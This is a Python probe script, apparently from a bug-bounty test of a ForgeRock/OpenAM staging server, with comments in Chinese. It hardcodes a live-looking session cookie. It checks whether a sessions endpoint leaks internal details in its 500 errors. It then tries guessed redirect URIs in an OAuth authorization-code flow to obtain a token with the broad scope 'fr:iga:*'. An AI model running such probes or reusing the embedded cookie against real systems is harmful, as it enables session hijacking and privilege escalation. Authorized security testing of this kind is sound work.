# -*- coding: utf-8 -*-
"""AIC 第五轮:1) sessions 500 详情(信息泄露) 2) 用 cookie 会话走 OAuth 授权码流换新 token
预期结果表:
  成立 -> 500 无内部信息;authorize 需 redirect_uri 匹配或拒绝
  不成立(发现) -> 500 泄露堆栈/内部路径;授权码流成功拿到 fr:iga:* token(可枚举 IGA 面)
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=IFE9DsM4gWKUGQHkQczCcFOQc8Q.*AAJTSQACMDIAAlNLABxpYlZOOXByMGZQRGNycDhwTGxXS21iZGxDSjA9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'research-1643',
                  'Cookie': COOKIE})

print('=== 1. sessions 500 完整响应 ===')
r = S.get(BASE + '/am/json/realms/alpha/sessions?_queryFilter=true', timeout=12, verify=False)
print('status:', r.status_code)
print('headers:', dict(list(r.headers.items())[:12]))
print('body:', r.text[:2000])

print('\n=== 2. OAuth 授权码流(用会话 cookie 自动认证) ===')
# 尝试常见 redirect_uri
for ru in ['https://openam-bug-bounty-stag.forgeblocks.com/enduser/callback',
           'https://openam-bug-bounty-stag.forgeblocks.com/enduser/',
           'https://openam-bug-bounty-stag.forgeblocks.com/enduser?realm=/alpha']:
    url = (BASE + '/am/oauth2/alpha/authorize?client_id=endUserUIClient'
           '&response_type=code&scope=fr:iga:*%20openid&redirect_uri=' + ru)
    try:
        r = S.get(url, timeout=12, verify=False, allow_redirects=False)
        loc = r.headers.get('Location', '')
        print('ru=%-70s -> %d loc=%s' % (ru, r.status_code, loc[:150]))
        if r.status_code == 302 and 'code=' in loc:
            print('  >>> CODE:', loc)
    except Exception as e:
        print('ru=%s ERR %s' % (ru, str(e)[:60]))
